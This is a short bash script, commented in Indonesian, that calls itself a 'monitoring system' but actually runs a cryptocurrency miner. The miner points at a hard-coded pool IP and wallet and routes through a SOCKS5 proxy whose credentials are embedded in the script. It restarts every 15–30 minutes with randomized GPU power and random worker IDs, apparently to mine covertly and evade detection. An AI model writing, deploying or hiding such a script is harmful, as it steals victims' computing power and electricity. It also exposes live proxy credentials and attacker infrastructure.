#!/bin/bash

echo "Memulai sistem monitoring dengan penggunaan GPU berubah tanpa restart..."

# Jalankan miner pertama kali
./peak --coin pearl --url 192.210.169.184:80 --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999999) --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443 --gpu-power=50 --max-threads=2 &

# Simpan PID proses
MINER_PID=$!

while true; do
    # Acak penggunaan GPU antara 50-70% 
    gpu_power=$((RANDOM % 21 + 50))

    echo "Mengubah power GPU menjadi $gpu_power%"

    # Mengubah parameter GPU (ini bisa dilakukan dengan menghentikan dan restart)
    # Karena miner tidak support perubahan runtime, kita harus restart
    
    # Hentikan proses lama
    kill $MINER_PID 2>/dev/null
    
    # Tunggu sebentar
    sleep 2
    
    # Jalankan miner baru dengan parameter baru
    ./peak --coin pearl --url 192.210.169.184:80 --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999999) --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443 --gpu-power=$gpu_power --max-threads=2 &
    
    # Simpan PID baru
    MINER_PID=$!
    
    # Tunggu sebelum perubahan berikutnya (15-30 menit)
    wait_time=$((RANDOM % 900 + 900))
    echo "Menunggu $((wait_time/60)) menit..."
    sleep $wait_time
done
